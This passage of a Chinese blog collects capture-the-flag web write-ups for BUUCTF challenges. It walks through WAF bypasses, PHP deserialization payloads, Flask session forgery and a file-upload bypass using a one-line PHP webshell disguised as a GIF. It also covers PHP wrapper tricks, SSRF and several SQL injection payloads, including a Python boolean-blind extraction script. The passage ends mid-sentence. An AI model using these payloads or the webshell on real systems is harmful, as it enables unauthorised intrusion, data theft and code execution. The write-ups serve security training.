title="ySxgUg.png"><p>查看网页源码发现存在一个waf，初步判定waf过滤了字母字符等关键字，并且发现了calc.php文件。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySxh2n.png" class title="ySxh2n.png"><p>访问calc.php，出现了源码，不难看出，waf对num进行过滤后再次对某些特定的字符进行了过滤。最后eval函数会运行我们的payload</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySxTbT.png" class title="ySxTbT.png"><p>首先便是要绕过waf，这里就涉及到了php对字符串处理的一些特性，比如这里是通过?num进行传参，服务器对num这个变量进行了waf过滤，但是当我们将</p><p>?num变为? num时，就可以绕过waf的过滤，因为此时我们实际上waf认为我们传的参数是</p><p>” num”而不是”num”，绕过了waf的检测，而php在处理” num”时又会自己吧空格给去掉，所以我们就成功绕过了waf。</p><p>现在，我们可以控制num的值了，在不使用黑名单中的字符的情况下输出flag。</p><p>首先我们通过scandir()访问calc.php目录下所有的文件</p><p>payload:? num=vardump(scandir(chr(47)))</p><p>这里的chr(47)对应字符 ‘/’ 由于 ‘/’ 字符在黑名单中，所以我们通过chr()函数来绕过</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySxq54.png" class title="ySxq54.png"><p>发现flag文件为f1agg</p><p>构造payload</p><p>? num=var_dump(file_get_contents(/f1agg))</p><p>将f1agg全部替换为chr()</p><p>var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</p><p>get flag!</p><h2 id="极客大挑战-2019-PHP1"><a href="#极客大挑战-2019-PHP1" class="headerlink" title="[极客大挑战 2019]PHP1"></a>[极客大挑战 2019]PHP1</h2><p>记一次PHP反序列化，这次反序列化学到了一点新的内容</p><p>首先发现网页源码，网页告诉我们有出题者吧网页给备份了，我们用dirsearch扫描了该网页的目录，扫到了存在源码备份文件</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySzGzn.png" class title="ySzGzn.png"><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ypSkwT.png" class title="ypSkwT.png"><p>打开index.php 发现引入了class.php并且将接收的select参数反序列化</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySzcsx.png" class title="ySzcsx.png"><p>进入class.php我们发现如下代码，定义了Name类的__destruct()方法，当名为Name的类被摧毁时，检查password是否为100，username是否为admin，若是，则输出flag</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySz4Fe.png" class title="ySz4Fe.png"><p>思路就是我们需要序列化一个名为Name的类，并且这里面需要两个私有变量username=admin和password=100</p><p>构造：</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ySzIWd.png" class title="ySzIWd.png"><p>输出为：</p><p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;s:3:”100″;}</p><p>这个时候需要引入一些修饰符，在反序列化中，</p><p>成员属性为public修饰的不用太多的修饰原生构造就好</p><p>而private需要加**%00Name%00**，</p><p>protected则需要使用 <strong>%00*%00username</strong>这样的方式</p><p>所以这里的构造就成了,修改2为3绕过wakeup检测</p><p>O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100″;}</p><p>get flag!</p><h2 id="HCTF-2018-admin1"><a href="#HCTF-2018-admin1" class="headerlink" title="[HCTF 2018]admin1"></a>[HCTF 2018]admin1</h2><p><span style="color:red">这道题涉及到了基于flask的session伪造</span></p><p>打开题目，首先注册一个账号并且登录</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/yppIKI.png" class title="yppIKI.png"><p>提示我们要通过管理员登录</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/yppTqP.png" class title="yppTqP.png"><p>在这个更改密码的地方发现了hint</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/yppOPg.png" class title="yppOPg.png"><p>访问该网站我们发现了网页的源码，这是一个基于flask框架的网站。</p><p>那么如何让我们作为admin登录呢？由于flask框架是一个轻量级的web框架，对于session的存储是放在客户端的，我们能够得到session的具体值，那么只要通过session伪造，将这个session解码并且修改用户名为admin后重新加密访问该网站就可以以admin的身份登陆了。</p><p>这里用到一个工具：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flask-session-cookie-manager</span><br><span class="line">解码session需要一个key，在源码中我发现key的值为ckj123</span><br></pre></td></tr></table></figure><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/yp9Gzd.png" class title="yp9Gzd.png"><p>白色部分为我们解码的session，我们复制下来后将’name’的值更改为admin，重新用脚本加密</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/yp9aeP.png" class title="yp9aeP.png"><p>获得新的session</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/yp9wo8.png" class title="yp9wo8.png"><p>成功成为admin 获得flag</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/yp9DJg.png" class title="yp9DJg.png"><h2 id="极客大挑战-2019-Upload1"><a href="#极客大挑战-2019-Upload1" class="headerlink" title="[极客大挑战 2019]Upload1"></a>[极客大挑战 2019]Upload1</h2><p><span style="color:red">题目考点：文件上传过滤绕过</span></p><p>首先题目让我们上传图片，我真的就穿了个图片过去，发现不能上传png，jpg格式都不能上传，很奇怪。</p><p>然后我将我的一句话上传，显示错误，识别是php</p><p>然后使用phtml后缀上传发现过滤了?&gt;，所以使用新的写法写一个图片马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF98a&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;Mengda&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>这样即绕过文件头检测也可以绕过?&gt;过滤</p><p>传马 getflag</p><h2 id="SUCTF-2019-CheckIn1"><a href="#SUCTF-2019-CheckIn1" class="headerlink" title="[SUCTF 2019]CheckIn1"></a>[SUCTF 2019]CheckIn1</h2><p><span style="color:red">题目考点 .user.ini动态配置文件的使用，exif_imagetype()函数的绕过</span></p><p>查看源码后发现该题使用的是exif_imagetype()函数检测文件类型，exif_imagetype()是通过检查文件头来检测上传文件的类型，所以我们通过过伪造文件头的方式制作图片马，在前面加上GIF98a，成功上传。</p><p>上传成功后回显</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-23-1024x354.png" class><p>返回我们的文件上传到了uploads/巴拉巴拉巴拉这个目录下，我们发现这个目录下有个index.php ？？？？ 为什么这里会出现index.PHP? 联想到图片马需要文件包含漏洞才可以被执行，那么肯定需要某种办法让index.php包含这个图片马或者让php自动包含这个图片马。怎样才能做到呢？这里就需要引入新的一个知识点</p><p>.user.ini配置文件，这个是一个动态配置文件，访问时生效。而这个配置文件中可以添加一条属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;php.jpg</span><br></pre></td></tr></table></figure><p>表明我们运行此文件夹下的php文件时会自动包含php.jpg，这不就可以触发我们的图片马了吗，上传 链接，访问index.php</p><p> getflag！</p><h2 id="ZJCTF-2019-NiZhuanSiWei1"><a href="#ZJCTF-2019-NiZhuanSiWei1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei1"></a>[ZJCTF 2019]NiZhuanSiWei1</h2><p><span style="color:red">本题考点。data://伪协议，php://filter伪协议，php反序列化</span></p><p>打开题目是经典的给源码题</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-26-1024x515.png" class><p>分析一下逻辑吧，三个参数text,file,password。首先进行判断test内容是否为指定文本，然后检测file中是否含有flag字符串，然后包含文件file，这里注释告诉我们需要包含useless.php。最后将password进行反序列化后输出。</p><p>看到这里，将一个反序列化对象进行输出，我们就可以猜测到useless.php肯定是修改了__Tostring魔术方法。</p><p>看到file_get_contens，include之类的函数，首先就想到php伪协议这里需要进行判断文件内容，那我们使用data://绕过第一个判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?test&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome the zjctf</span><br></pre></td></tr></table></figure><p>然后我们通过文件包含漏洞通过php:filter读取useless.php的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:&#123;s:4:”file”;s:8:”flag.php”;&#125;</span><br></pre></td></tr></table></figure><p>把源码通过base64输出后解码发现</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-27-1024x577.png" class><p>php反序列化，本地反序列化</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-28.png" class><p>反序列化结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:”Flag”:1:&#123;s:4:”file”;s:8:”flag.php”;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：http:&#x2F;&#x2F;43116097-03b5-4007-aa37-e2aed848730d.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:&#123;s:4:”file”;s:8:”flag.php”;&#125;</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2018-Fakebook1"><a href="#网鼎杯-2018-Fakebook1" class="headerlink" title="[网鼎杯 2018]Fakebook1"></a>[网鼎杯 2018]Fakebook1</h2><p><span style="color:red">本题考点。本题考点：SSRF，SQL注入，sql反序列化。</span></p><p>进入题目环境，进行信息收集。首先访问robots.txt</p><p>源码泄露，打开源码后如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output &#x3D; curl_exec($ch);</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码审计后发现get()函数使用了curl函数，可能存在ssrf攻击。</p><p>curl函数，是通过服务器获取目标url地址内容的一种方法，这里是通过服务器访问，正好满足ssrf的条件，利用这里的漏洞就可以构造get函数的url，达到访问服务器内部资源的目的。</p><p>但是这里面的isValidBlog函数进行了过滤，导致我们无法构造类似于file:///var/www/html/xxx之类的payload。至此，源码分析结束。</p><p>打开网站，查看了login,join，主页面的源码后没有发现什么有用的信息。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-31-1024x233.png" class><p>进入join，添加信息</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-32-1024x178.png" class><p>在blog一栏我输的是百度的地址，添加成功后我们点进去看看，可以发现刚刚我们进行源码审计的时候，curl函数发挥了作用，目标url已经成功访问。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-33-1024x385.png" class><p>接下来寻找新的攻击入口，注意到地址栏存在get传参，考虑sql注入，引号出现了报错，存在注入。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-34-1024x116.png" class><p>尝试测试回显</p><p>使用联合查询发现union select 被过滤了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用&#x2F;**&#x2F;或者union all select绕过，这里我使用&#x2F;**&#x2F;绕过</span><br></pre></td></tr></table></figure><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-35-1024x328.png" class><p>回显为2</p><p>接下来爆表爆字段就好，这里不过多讲述。最后发现在users表的data字段保存着一段序列化过后的信息。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-36-1024x327.png" class><p>接着将序列化数据修改后通过sql语句注入，这里的flag.php是扫描到的。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-37-1024x372.png" class><p>注意，这里如果你是直接修改sql注出来的data，记得修改url前面的长度数据，不然会导致报错。注入顺序也要在第4位，至于为什么，猜测可能是4号位的回显对应执行序列化操作。</p><p>注入成功后在源码中发现flag，base64解密即可。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-38-1024x175.png" class><h2 id="CISCN2019-华北赛区-Day2Web1-Hack-World1"><a href="#CISCN2019-华北赛区-Day2Web1-Hack-World1" class="headerlink" title="[CISCN2019 华北赛区 Day2Web1]Hack World1"></a>[CISCN2019 华北赛区 Day2Web1]Hack World1</h2><p><span style="color:red">本题考点：bool盲注。</span></p><p>今天研究了一下午这道题，也是我的第一道bool盲注类型的题目。之前很少有刷sql注入类型的题，有也是非常简单的报错注入，数字型注入，和一些简单的绕过，这次通过这道题对sql注入的理解深刻了那么一丢丢。</p><p>首先拿到题目，告诉我们flag就在flag表当中的flag字段里面，现在回想起来看到这应该就意识到不是一般的报错，字符，数字型注入了。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-39-1024x303.png" class><p>经过我的测试，输入数据1，2都会有回显，输入(union)提示sql注入检测,用我的字典跑一下。发现ascii(substr())没有被过滤，那么直接通过bool盲注脚本即可跑出flag</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-40.png" class><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">def boolblind():</span><br><span class="line">    pd &#x3D; 1</span><br><span class="line">    flag &#x3D; &#39;&#39;</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;eb79ed3f-2f14-4d1c-9c24-20fad4cbe417.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line">    for i in range(1,50):#flag的长度，假设flag长度不超过50</span><br><span class="line">        if pd &#x3D;&#x3D; 1:</span><br><span class="line">            max &#x3D; 127</span><br><span class="line">            min &#x3D; 0</span><br><span class="line">            for c in range(0,127):</span><br><span class="line">                half &#x3D; (int)((max + min) &#x2F; 2)</span><br><span class="line">                payload &#x3D; &#39;1^(ascii(substr((select(flag)from(flag)),&#39;+str(i)+&#39;,1))&#39;+&#39;&gt;&#39;+str(half)+&#39;)&#39;</span><br><span class="line">                r &#x3D; requests.post(url,data&#x3D;&#123;&#39;id&#39;:payload&#125;)</span><br><span class="line">                time.sleep(0.001)</span><br><span class="line">                if &#39;Hello, glzjin wants a girlfriend.&#39; in str(r.content):</span><br><span class="line">                    max &#x3D; half</span><br><span class="line">                else:</span><br><span class="line">                    min &#x3D; half</span><br><span class="line">                if ((max - min) &lt;&#x3D; 1):</span><br><span class="line">                    if max !&#x3D; 1:</span><br><span class="line">                        flag &#x3D; flag + chr(max)</span><br><span class="line">                    else:</span><br><span class="line">                        pd &#x3D; 0</span><br><span class="line">                        break</span><br><span class="line">                    print(flag)</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    boolblind()</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-HardSQL1"><a href="#极客大挑战-2019-HardSQL1" class="headerlink" title="[极客大挑战 2019]HardSQL1"></a>[极客大挑战 2019]HardSQL1</h2><p><span style="color:red">考点：sql报错注入，空格绕过</span></p><p>fuzz后发现过滤了空格，union等字符串，尝试/**/绕过空格失败，尝试堆叠注入失败，想到了报错注入updatexml()</p><p>没什么好讲的了，构造payload，爆库爆表爆字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆库admin’or(updatexml(1,concat(0x7e,database(),0x7e),1))%23</span><br><span class="line">爆表dmin’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23</span><br><span class="line">爆字段admin’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’)),0x7e),1))%23</span><br></pre></td></tr></table></figure><p>这里值得注意的是爆字段只出来了一般的flag，需要用到right()函数输出flag后半部分字段，拼接获得flag！</p><h2 id="GXYCTF2019-BabySQli1"><a href="#GXYCTF2019-BabySQli1" class="headerlink" title="[GXYCTF2019]BabySQli1"></a>[GXYCTF2019]BabySQli1</h2><p><span style="color:red">考点：username，password分别验证，联合查询不存在数据会自动创造。</span></p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-43-1024x348.png" class><p>admin登录显示密码错误，证明有admin这个用户存在。</p><p>联合查询发现有3个字段</p><p>这个题有一行base32加密，解密后是一段base64，在解密后变成了一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure><p>通过wp了解到，这个题是先查询username查到user后在查询user对应的md5密码，将对应的md5密码和传入的pw参数md5加密后进行比对</p><p>我构造</p><p>name=1′ union select 1,’admin’,3&amp;pw=123</p><p>不会报错，sql首先查询name为1的字段，没有查找到，但是返回了select的数据，经测试只有第二个字段数据为admin的时候才不会报错，那么可以判断2号字段对应用户名字段，猜测3号为密码md5字段。</p><p>这里有一个特性，在执行联合查询的时候，如果联合查询前面的数据不存在，那么就会往数据库插入对应字段的数据。</p><p>比如说 我构造的payload</p><p>name=1′ union select 1,’admin’,3&amp;pw=123</p><p>1查询不存在，union select会往对应的user字段插入admin，password字段插入3</p><p>那么现在我只需要在3号字段传入123的md5，并且用户名为admin，那么就可以使用admin/123进行登陆了</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-44-1024x350.png" class><p>get flag！</p><h2 id="网鼎杯-2020-青龙组-AreUSerialz1"><a href="#网鼎杯-2020-青龙组-AreUSerialz1" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz1"></a>[网鼎杯 2020 青龙组]AreUSerialz1</h2><p><span style="color:red">考点：php反序列化，弱相等。</span></p><p>拿到这道题目直接高亮了源代码，我们进行一波审计</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op &#x3D; &quot;1&quot;;</span><br><span class="line">        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;</span><br><span class="line">        $content &#x3D; &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">            $res &#x3D; $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res &#x3D; &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res &#x3D; file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br><span class="line">        $this-&gt;content &#x3D; &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str &#x3D; (string)$_GET[&#39;str&#39;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj &#x3D; unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显需要我们传入序列化对象给str变量，我们传入的序列化字符串经过is_valid函数后便会被实例化，当他被销毁时即调用__destruct进入process，首先检测op===’2’注意这里是===全等于，我们在序列化的时候将op=2即可绕过，因为他不是字符串类型。接着绕过isvalid，ascall码要在35到125之间，protect序列化后会出现%00这样的参数，但是在PHP7.1以上对序列化字符串属性检测并不严格，所以直接使用public就可以绕过了,至于flag.php，根据经验我直接访问确实有这个文件，所以就知道了。</p><p>构造payload：O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:5:”hello”;}</p><p>get flag!</p><h2 id="GYCTF2020-Blacklist1"><a href="#GYCTF2020-Blacklist1" class="headerlink" title="[GYCTF2020]Blacklist1"></a>[GYCTF2020]Blacklist1</h2><p><span style="color:red">考点，堆叠注入，handler语句</span></p><p>首先堆叠注入查询发现了flag所在的表，题目过滤了很多关键字，但是发现可以堆叠注入，通过查询mysql手册发现hander命令，handler命令可以做到访问表。handler命令语法如下：</p><p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</p><p>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ 